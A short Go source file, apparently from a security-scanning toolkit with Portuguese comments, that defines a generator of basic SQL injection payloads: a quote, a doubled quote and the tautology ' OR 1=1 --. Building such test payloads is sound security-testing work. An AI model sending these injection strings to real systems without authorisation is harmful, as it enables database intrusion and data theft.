
package payloads

import (
	"github.com/GhostN3xus/Huntsuite/pkg/modules"
)

// SQLiPayloadGenerator gera payloads SQLi.
type SQLiPayloadGenerator struct{}

// NewSQLiPayloadGenerator cria um novo gerador de payload SQLi.
func NewSQLiPayloadGenerator() *SQLiPayloadGenerator {
	return &SQLiPayloadGenerator{}
}

// Name retorna o nome do gerador de payload.
func (g *SQLiPayloadGenerator) Name() string {
	return "sqli_basic"
}

// Generate gera uma lista de payloads SQLi.
func (g *SQLiPayloadGenerator) Generate(ctx *modules.TargetContext) ([]modules.Payload, error) {
	payloads := []modules.Payload{
		{Value: "'", Type: "SQLi", Encoding: "URL"},
		{Value: "''", Type: "SQLi", Encoding: "URL"},
		{Value: "' OR 1=1 --", Type: "SQLi", Encoding: "URL"},
	}
	return payloads, nil
}
